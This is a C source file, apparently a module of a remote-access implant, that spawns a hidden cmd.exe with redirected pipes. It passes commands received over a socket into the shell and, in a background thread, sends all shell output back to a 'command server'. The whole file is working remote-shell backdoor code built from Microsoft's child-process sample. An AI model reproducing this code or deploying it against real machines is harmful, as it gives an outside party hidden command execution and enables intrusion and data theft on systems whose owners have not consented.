/*
    Code for spawning a command prompt and piping I/O to/from the process
    Code is modified from https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
*/

#include "common.h"
#include "utils.h"
#include "cmd.h"

// Create a structure (and global instance of it) that holds all the globals used in this file
// This helps organize the globals and make it more obvious where each global is coming from
struct cmdGlobalsStruct {
    HANDLE cmdOut;       // set by createCommandPrompt()
    HANDLE cmdIn;        // set by createCommandPrompt()
    SOCKET cmdSock;      // copied from socket passed to startCMD
    HANDLE cmdOutThread; // set by startCMD
} cmdGlobals;

/*
* Initialize the module. This consists of 2 main actions:
*   1) Spawn a command prompt process with redirected I/O
*   2) Start a thread to constantly send the command prompt's output back to the command server
*
* parameters:
*	[in] sock - the socket to send the command prompt output to
* returns:
*	true on success, false on failure
*   in the case of failure, the error is logged automatically
*/
BOOL startCMD(SOCKET sock) {
    // create the child process with I/O pipes
    BOOL bSuccess = createCommandPrompt();
    if (!bSuccess) {
        logMessage("Failed to spawn child command prompt process\n");
        return FALSE;
    }
    // set the command prompt output socket
    cmdGlobals.cmdSock = sock;
    // create the output thread
    cmdGlobals.cmdOutThread = CreateThread(
        NULL,            // default security attributes
        0,               // default stack size
        cmdOutputThread, // run the cmdOutputThread function
        NULL,            // no parameters passed - the thread can access the globals
        0,               // thread creation flags
        NULL        // output for the thread ID
    );
    if (cmdGlobals.cmdOutThread == NULL) {
        int err = GetLastError();
        logMessage("CreateThread failed with error %d\n", err);
        return FALSE;
    }
    return TRUE;
}

/*
* Spawn a command prompt with redirected I/O
*
* parameters:
*	N/A
* returns:
*	true on success, false on failure
*   in the case of failure, the error is logged automatically
*/
BOOL createCommandPrompt() {
    /*
    * First, create the I/O pipes
    */
    HANDLE g_hChildStd_OUT_Wr, g_hChildStd_IN_Rd;
    // set the bInheritHandle flag so pipe handles are inherited
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    // create a pipe for the child process's STDOUT
    if (!CreatePipe(&cmdGlobals.cmdOut, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
        int err = GetLastError();
        logMessage("CreatePipe failed with error %d\n", err);
        return FALSE;
    }
    // ensure the read handle to the pipe for STDOUT is not inherited
    if (!SetHandleInformation(cmdGlobals.cmdOut, HANDLE_FLAG_INHERIT, 0)) {
        int err = GetLastError();
        logMessage("SethandleInformation failed with error %d\n", err);
        return FALSE;
    }
    // create a pipe for the child process's STDIN
    if (!CreatePipe(&g_hChildStd_IN_Rd, &cmdGlobals.cmdIn, &saAttr, 0)) {
        int err = GetLastError();
        logMessage("CreatePipe failed with error %d\n", err);
        return FALSE;
    }
    // ensure the write handle to the pipe for STDIN is not inherited
    if (!SetHandleInformation(cmdGlobals.cmdIn, HANDLE_FLAG_INHERIT, 0)) {
        int err = GetLastError();
        logMessage("SethandleInformation failed with error %d\n", err);
        return FALSE;
    }
    /*
    * Next, create the child process
    */
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;
    // clear the PROCESS_INFORMATION structure to receive info from CreateProcess()
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    // set up the STARTUPINFO structure
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr; // redirect STD_ERR
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr; // redirect STD_OUT
    siStartInfo.hStdInput = g_hChildStd_IN_Rd; // redirect STD_IN
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES; // use the I/O redirections
    // get the path to cmd.exe
    char sysPath[MAX_PATH], cmdPath[MAX_PATH];
    if(GetSystemDirectory(sysPath, MAX_PATH) == 0) {
        int err = GetLastError();
        logMessage("Failed to get system directory with error code: %d\n", err);
        return FALSE;
    }
    sprintf(cmdPath, "%s\\cmd.exe", sysPath);
    // create the child process
    bSuccess = CreateProcess(
        cmdPath,          // application name
        NULL,             // command line
        NULL,             // process security attributes
        NULL,             // primary thread security attributes
        TRUE,             // handles are inherited
        CREATE_NO_WINDOW, // creation flags
        NULL,             // use parent's environment
        NULL,             // use parent's current directory
        &siStartInfo,     // STARTUPINFO pointer
        &piProcInfo);     // receives PROCESS_INFORMATION
    // if an error occurs, return the error
    if (!bSuccess) {
        int err = GetLastError();
        logMessage("CreateProcess failed with error %d\n", err);
        return FALSE;
    }
    else {
        // close handles to the child process and its primary thread
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        // close handles to the pipes passed to the child
        // if these aren't explicitly closed, there's no way to recognize when the child process has ended
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
    // return success
    return TRUE;
}

/*
* Send a string of input to the child command prompt process
* NOTE: The input is NOT automatically entered. Newlines must be provided manually
*
* parameters:
*	[in] buff - the buffer containing the input string
*   [in] inputLen - the length of the input string
* returns:
*	true on success, false on failure
*   in the case of failure, the error is logged automatically
*/
BOOL inputToCMD(char* buff, int inputLen) {
    DWORD written;
    BOOL bSuccess;
    // TODO - loop this to make sure everything gets written
    bSuccess = WriteFile(cmdGlobals.cmdIn, buff, inputLen, &written, NULL);
    if (!bSuccess) {
        DWORD err = GetLastError();
        if (err == ERROR_BROKEN_PIPE) {
            logMessage("Command prompt closed. Cannot enter new commands\n");
        } else {
            logMessage("Failed to write input to command prompt with error code: %d\n", err);
        }
        return FALSE;
    }
    return TRUE;
}

/*
* Function to run the command prompt output thread. Output will be continuously read from command prompt
*   and sent to the command server using the socket provided to startCMD()
*
* parameters:
*	[in] lpParam - thread parameters (this is unused since the thread can access the cmd globals struct)
* returns:
*	0 when exiting due to command prompt closing, otherwise returns the last error code
*/
DWORD WINAPI cmdOutputThread(LPVOID lpParam) {
    DWORD dwRead, dwWritten, dResult;
    CHAR chBuf[4096];
    BOOL bSuccess;

    while (TRUE)
    {
        // read the command prompt output
        bSuccess = ReadFile(cmdGlobals.cmdOut, chBuf, 4096, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE) {
                logMessage("Command prompt closed. Stopping cmd output thread\n");
                return 0;
            } else if (!bSuccess) {
                logMessage("Readfile error in cmd output thread: %d\n", err);
            } else {
                logMessage("Read 0 bytes from command prompt. Stopping cmd output thread\n");
            }
            return err;
        }
        // send the output to the command server
        dResult = send(cmdGlobals.cmdSock, chBuf, dwRead, 0);
        if (dResult == SOCKET_ERROR) {
            logMessage("Failed to send cmd output to command server with error code: %d\n", WSAGetLastError());
            return dResult;
        }
    }
}